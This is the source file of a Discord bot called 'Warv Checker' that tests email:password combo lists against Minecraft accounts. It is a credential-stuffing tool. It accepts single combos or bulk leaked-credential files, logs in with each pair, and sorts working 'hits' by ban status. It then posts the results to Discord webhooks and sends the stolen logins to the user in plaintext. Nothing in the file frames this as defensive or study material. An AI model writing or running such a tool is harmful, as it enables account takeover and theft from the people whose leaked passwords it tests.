require('dotenv').config();
const { Client, GatewayIntentBits, WebhookClient, REST, Routes, SlashCommandBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const WarvChecker = require('./checker');
const EmbedBuilder = require('./embedBuilder');
const fs = require('fs');

const TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages] });
const checker = new WarvChecker();

let config = {
    authorizedUsers: [],
    webhooks: {
        unbanned: "",
        banned: "",
        hits: ""
    },
    ownerId: ""
};

function loadConfig() {
    try {
        if (fs.existsSync('./config.json')) {
            config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
        }
    } catch (error) {
        console.error(`Error loading config: ${error.message}`);
    }
}

function saveConfig() {
    try {
        fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
    } catch (error) {
        console.error(`Error saving config: ${error.message}`);
    }
}

loadConfig();

const webhookClients = {
    unbanned: config.webhooks.unbanned ? new WebhookClient({ url: config.webhooks.unbanned }) : null,
    banned: config.webhooks.banned ? new WebhookClient({ url: config.webhooks.banned }) : null,
    hits: config.webhooks.hits ? new WebhookClient({ url: config.webhooks.hits }) : null,
    default: WEBHOOK_URL ? new WebhookClient({ url: WEBHOOK_URL }) : null
};

const logStream = fs.createWriteStream('debug.log', { flags: 'a' });
const originalLog = console.log;
const originalError = console.error;

console.log = function (...args) {
    const msg = `[${new Date().toISOString()}] ` + args.join(' ') + '\n';
    logStream.write(msg);
    originalLog.apply(console, args);
};

console.error = function (...args) {
    const msg = `[${new Date().toISOString()}] ERROR: ` + args.join(' ') + '\n';
    logStream.write(msg);
    originalError.apply(console, args);
};

const commands = [
    new SlashCommandBuilder()
        .setName('check')
        .setDescription('Check a Minecraft account or upload a combo list')
        .addStringOption(option =>
            option.setName('combo')
                .setDescription('The account combo (email:password)'))
        .addAttachmentOption(option =>
            option.setName('file')
                .setDescription('Upload a combo list file (.txt)')),
    new SlashCommandBuilder()
        .setName('auth')
        .setDescription('Manage authorized users (Owner only)')
        .addSubcommand(sub =>
            sub.setName('add')
                .setDescription('Authorize a user')
                .addUserOption(opt => opt.setName('user').setDescription('User to authorize').setRequired(true)))
        .addSubcommand(sub =>
            sub.setName('remove')
                .setDescription('Unauthorize a user')
                .addUserOption(opt => opt.setName('user').setDescription('User to unauthorize').setRequired(true)))
        .addSubcommand(sub =>
            sub.setName('list')
                .setDescription('List authorized users')),
    new SlashCommandBuilder()
        .setName('webhook')
        .setDescription('Set webhooks for different result categories')
        .addStringOption(opt =>
            opt.setName('category')
                .setDescription('The result category')
                .setRequired(true)
                .addChoices(
                    { name: 'Unbanned', value: 'unbanned' },
                    { name: 'Banned', value: 'banned' },
                    { name: 'All Hits', value: 'hits' }
                ))
        .addStringOption(opt =>
            opt.setName('url')
                .setDescription('The Webhook URL')
                .setRequired(true)),
    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Show help menu')
].map(command => command.toJSON());

async function sendToWebhook(embed, category = 'default') {
    try {
        let clientToUse = webhookClients[category] || webhookClients.default;

        // Always try to send to "hits" webhook if it exists and category isn't already hits
        if (category !== 'hits' && webhookClients.hits) {
            await webhookClients.hits.send({
                embeds: [embed],
                username: "Warv Checker",
                avatarURL: "https://i.postimg.cc/Xvh32RQr/IMG-20260129-110839.jpg"
            }).catch(() => { });
        }

        if (clientToUse) {
            await clientToUse.send({
                embeds: [embed],
                username: "Warv Checker",
                avatarURL: "https://i.postimg.cc/Xvh32RQr/IMG-20260129-110839.jpg"
            });
        }
    } catch (error) {
        console.error(`Webhook error (${category}): ${error.message}`);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag} (ID: ${client.user.id})`);
    console.log('------');

    if (!config.ownerId) {
        const app = await client.application.fetch();
        config.ownerId = app.owner.id;
        saveConfig();
        console.log(`Owner ID set to: ${config.ownerId}`);
    }

    // Register slash commands
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
        console.log('Started refreshing application (/) commands.');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }

    client.user.setActivity('Warv Checker', { type: 3 }); // ActivityType.Watching = 3
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'check') {
        if (interaction.user.id !== config.ownerId && !config.authorizedUsers.includes(interaction.user.id)) {
            return interaction.reply({ content: "❌ You don't have permission to use this command! Use `/auth` if you are the owner.", ephemeral: true });
        }

        await interaction.deferReply({ ephemeral: true });

        const combo = interaction.options.getString('combo');
        const file = interaction.options.getAttachment('file');

        if (!combo && !file) {
            return interaction.editReply("❌ Please provide either a `combo` or upload a `file`!");
        }

        if (combo && file) {
            return interaction.editReply("❌ Please provide ONLY one: either `combo` OR `file`.");
        }

        if (combo) {
            try {
                if (!combo.includes(':')) {
                    return interaction.editReply("❌ Invalid format! Please use `email:password`.");
                }

                const [email, password] = combo.split(':');
                const data = await checker.checkAccount(email.trim(), password.trim());
                const embed = EmbedBuilder.buildResultEmbed(data);

                let category = 'default';
                if (data.success && data.username && data.username !== 'N/A') {
                    if (data.donut?.status === 'Unbanned') category = 'unbanned';
                    else if (data.donut?.status === 'Banned') category = 'banned';
                }

                await sendToWebhook(embed, category);
                await interaction.editReply({ embeds: [embed] });

            } catch (error) {
                await interaction.editReply(`❌ An error occurred: ${error.message}`);
            }
        } else if (file) {
            if (!file.name.endsWith('.txt')) {
                return interaction.editReply("❌ Please upload a `.txt` file!");
            }

            try {
                const response = await axios.get(file.url);
                const text = response.data;
                const lines = text.split(/\r?\n/);
                const combos = lines.filter(line => line.includes(':')).map(line => line.trim());

                if (combos.length === 0) {
                    return interaction.editReply("❌ No valid combos found in file!");
                }

                const stats = {
                    total: combos.length,
                    checked: 0,
                    hits: 0,
                    unbanned: 0,
                    banned: 0,
                    bad: 0
                };

                const hitData = {
                    unbanned: [],
                    banned: [],
                    else: []
                };

                const statusEmbed = EmbedBuilder.buildStatusEmbed(stats);
                const statusMessage = await interaction.channel.send({ embeds: [statusEmbed] });
                await interaction.editReply(`✅ Bulk check started! Monitoring progress in the public status message below.`);

                for (let i = 0; i < combos.length; i++) {
                    const [email, password] = combos[i].split(':');
                    try {
                        const data = await checker.checkAccount(email.trim(), password.trim());
                        stats.checked++;

                        if (data.success) {
                            if (data.username && data.username !== 'N/A') {
                                stats.hits++;
                                let category = 'default';
                                if (data.donut?.status === 'Unbanned') {
                                    stats.unbanned++;
                                    category = 'unbanned';
                                    hitData.unbanned.push(`${data.email}:${data.password} | ${data.username} (Unbanned)`);
                                } else if (data.donut?.status === 'Banned') {
                                    stats.banned++;
                                    category = 'banned';
                                    hitData.banned.push(`${data.email}:${data.password} | ${data.username} (Banned)`);
                                } else {
                                    category = 'hits';
                                    hitData.else.push(`${data.email}:${data.password} | ${data.username}`);
                                }

                                const embed = EmbedBuilder.buildResultEmbed(data);
                                await sendToWebhook(embed, category);
                            } else {
                                stats.bad++;
                            }
                        } else {
                            stats.bad++;
                        }

                        if (i % 5 === 0 || i === combos.length - 1) {
                            const newEmbed = EmbedBuilder.buildStatusEmbed(stats);
                            await statusMessage.edit({ embeds: [newEmbed] });
                        }
                    } catch (error) {
                        console.error(`Error checking ${email}: ${error.message}`);
                    }
                }

                await statusMessage.edit({ embeds: [EmbedBuilder.buildStatusEmbed(stats)] });
                await interaction.channel.send("✅ Bulk check completed! Check your DMs for results.");

                // Send DM Results
                let dmContent = `📊 **Bulk Check Results**\n\n`;
                if (hitData.unbanned.length > 0) dmContent += `✅ **Unbanned Hits:**\n\`\`\`\n${hitData.unbanned.join('\n')}\n\`\`\`\n`;
                if (hitData.banned.length > 0) dmContent += `❌ **Banned Hits:**\n\`\`\`\n${hitData.banned.join('\n')}\n\`\`\`\n`;
                if (hitData.else.length > 0) dmContent += `ℹ️ **Other Hits:**\n\`\`\`\n${hitData.else.join('\n')}\n\`\`\`\n`;

                if (dmContent.length > 2000) {
                    const buffer = Buffer.from(dmContent.replace(/📊 \*\*Bulk Check Results\*\*\n\n/g, ''), 'utf-8');
                    const attachment = new AttachmentBuilder(buffer, { name: 'results.txt' });
                    await interaction.user.send({ content: "📊 **Bulk Check Results** (too long for message, see attachment)", files: [attachment] }).catch(e => console.error("DM Error:", e));
                } else {
                    await interaction.user.send(dmContent).catch(e => console.error("DM Error:", e));
                }

            } catch (error) {
                await interaction.editReply(`❌ Error processing file: ${error.message}`);
            }
        }
    }

    if (interaction.commandName === 'auth') {
        if (interaction.user.id !== config.ownerId) {
            return interaction.reply({ content: "❌ Only the bot owner can use this command!", ephemeral: true });
        }

        const subcommand = interaction.options.getSubcommand();
        const user = interaction.options.getUser('user');

        if (subcommand === 'add') {
            if (config.authorizedUsers.includes(user.id)) {
                return interaction.reply({ content: `❌ ${user.tag} is already authorized!`, ephemeral: true });
            }
            config.authorizedUsers.push(user.id);
            saveConfig();
            await interaction.reply({ content: `✅ Authorized ${user.tag} (${user.id})`, ephemeral: true });
        } else if (subcommand === 'remove') {
            config.authorizedUsers = config.authorizedUsers.filter(id => id !== user.id);
            saveConfig();
            await interaction.reply({ content: `✅ De-authorized ${user.tag}`, ephemeral: true });
        } else if (subcommand === 'list') {
            const list = config.authorizedUsers.length > 0 ? config.authorizedUsers.map(id => `<@${id}> (${id})`).join('\n') : "None";
            await interaction.reply({ content: `📝 **Authorized Users:**\n${list}`, ephemeral: true });
        }
    }

    if (interaction.commandName === 'webhook') {
        if (interaction.user.id !== config.ownerId && !config.authorizedUsers.includes(interaction.user.id)) {
            return interaction.reply({ content: "❌ You don't have permission to use this command!", ephemeral: true });
        }

        const category = interaction.options.getString('category');
        const url = interaction.options.getString('url');

        config.webhooks[category] = url;
        saveConfig();
        webhookClients[category] = new WebhookClient({ url: url });

        await interaction.reply({ content: `✅ Webhook for \`${category}\` has been set successfully!`, ephemeral: true });
    }

    if (interaction.commandName === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('Warv Checker Help')
            .setColor(0x00FFFF)
            .addFields(
                { name: '/check <combo>', value: 'Check a single account (email:password)', inline: false },
                { name: '/check <file>', value: 'Upload a .txt file to check bulk accounts. Results sent to webhook.', inline: false }
            )
            .setFooter({ text: 'Made by Warv and Rahul' });

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
});

client.login(TOKEN).catch(err => {
    console.error(`❌ Error running bot: ${err.message}`);
});
